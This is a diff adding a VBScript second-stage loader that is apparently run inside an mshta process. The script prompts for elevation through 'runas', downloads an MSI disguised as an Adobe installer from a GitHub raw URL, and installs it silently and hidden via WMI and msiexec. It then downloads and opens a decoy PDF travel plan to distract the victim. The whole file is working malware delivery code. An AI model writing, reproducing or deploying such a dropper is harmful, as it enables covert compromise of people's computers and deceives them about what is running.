@@ -1,0 +1,122 @@
+' language: VBScript, file: stage2.txt, delivery: fetched at runtime
+' runs via Execute() inside Stage 1's mshta process
+
+Dim fso, sh, qs, tmp, selfPath, isAdmin
+Set fso = CreateObject("Scripting.FileSystemObject")
+Set sh  = CreateObject("WScript.Shell")
+qs  = Chr(34)
+tmp = sh.ExpandEnvironmentStrings("%TEMP%")
+
+' ---- self path via location.href (works because we're inside mshta) ----
+selfPath = location.href
+selfPath = Replace(selfPath, "file:///", "")
+selfPath = Replace(selfPath, "/", "\")
+
+' ---- admin probe ----
+isAdmin = True
+On Error Resume Next
+sh.RegWrite "HKLM\SOFTWARE\Microsoft\_a", "1", "REG_SZ"
+If Err.Number <> 0 Then isAdmin = False
+Err.Clear
+On Error GoTo 0
+If isAdmin Then sh.RegDelete "HKLM\SOFTWARE\Microsoft\_a"
+
+' ---- not admin: elevate via mshta runas ----
+If Not isAdmin Then
+    CreateObject("Shell.Application").ShellExecute _
+        "mshta.exe", qs & selfPath & qs, "", "runas", 1
+    self.close
+End If
+
+' ---- elevated from here ----
+Dim http, stream, msiUrl, msiPath, fetchOk, guid
+msiUrl  = "https://raw.githubusercontent.com/rotalbilly5-sketch/Dream/main/Adobe.msi"
+guid    = CreateObject("Scriptlet.TypeLib").GUID
+guid    = Replace(Replace(guid, "{", ""), "}", "")
+msiPath = tmp & "\" & guid & ".msi"
+
+fetchOk = False
+On Error Resume Next
+Set http = CreateObject("MSXML2.ServerXMLHTTP.6.0")
+http.open "GET", msiUrl, False
+http.setRequestHeader "User-Agent", "Mozilla/5.0"
+http.send
+On Error GoTo 0
+
+If http.status = 200 Then
+    On Error Resume Next
+    Set stream = CreateObject("ADODB.Stream")
+    stream.Type = 1
+    stream.Open
+    stream.Write http.responseBody
+    stream.SaveToFile msiPath, 2
+    stream.Close
+    On Error GoTo 0
+    If fso.FileExists(msiPath) Then
+        If fso.GetFile(msiPath).Size > 100000 Then fetchOk = True
+    End If
+End If
+
+If fetchOk Then
+    Dim wmiSvc, procClass, startup, cmdLine, pid
+    Set wmiSvc    = GetObject("winmgmts:\\.\root\cimv2")
+    Set procClass = wmiSvc.Get("Win32_Process")
+    Set startup   = wmiSvc.Get("Win32_ProcessStartup").SpawnInstance_
+    startup.ShowWindow = 0
+    cmdLine = "msiexec.exe /i " & qs & msiPath & qs & _
+              " /qn+ /quiet /norestart REBOOT=ReallySuppress ALLUSERS=1" & _
+              " MSIRESTARTMANAGERCONTROL=Disable MSIUSEREALADMINDETECTION=0" & _
+              " /L*v " & qs & tmp & "\m.log" & qs
+    procClass.Create cmdLine, Null, startup, pid
+End If
+
+' ---- settle (timeout via cmd, no WScript.Sleep) ----
+sh.Run "%COMSPEC% /c timeout /t 30 /nobreak >nul", 0, True
+
+' ---- decoy PDF ----
+Dim pdfUrl, pdfPath, ph, ps, edgePath
+pdfUrl  = "https://raw.githubusercontent.com/rotalbilly5-sketch/Dream/main/Travel-Meeting-Plan-Q4-2026.pdf"
+pdfPath = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Travel-Meeting-Plan-Q4-2026.pdf"
+
+On Error Resume Next
+Set ph = CreateObject("MSXML2.ServerXMLHTTP.6.0")
+ph.open "GET", pdfUrl, False
+ph.setRequestHeader "User-Agent", "Mozilla/5.0"
+ph.send
+On Error GoTo 0
+
+If ph.status = 200 Then
+    On Error Resume Next
+    Set ps = CreateObject("ADODB.Stream")
+    ps.Type = 1
+    ps.Open
+    ps.Write ph.responseBody
+    ps.SaveToFile pdfPath, 2
+    ps.Close
+    On Error GoTo 0
+
+    If fso.FileExists(pdfPath) Then
+        ' -- dynamic Edge detection --
+        edgePath = ""
+        Dim candidates, c
+        candidates = Array( _
+            sh.ExpandEnvironmentStrings("%ProgramFiles(x86)%") & "\Microsoft\Edge\Application\msedge.exe", _
+            sh.ExpandEnvironmentStrings("%ProgramFiles%") & "\Microsoft\Edge\Application\msedge.exe", _
+            sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Microsoft\Edge\Application\msedge.exe" _
+        )
+        For Each c In candidates
+            If fso.FileExists(c) Then
+                edgePath = c
+                Exit For
+            End If
+        Next
+
+        If edgePath <> "" Then
+            sh.Run qs & edgePath & qs & " " & qs & pdfPath & qs, 1, False
+        Else
+            CreateObject("Shell.Application").ShellExecute pdfPath, "", "", "open", 1
+        End If
+    End If
+End If
+
+self.close
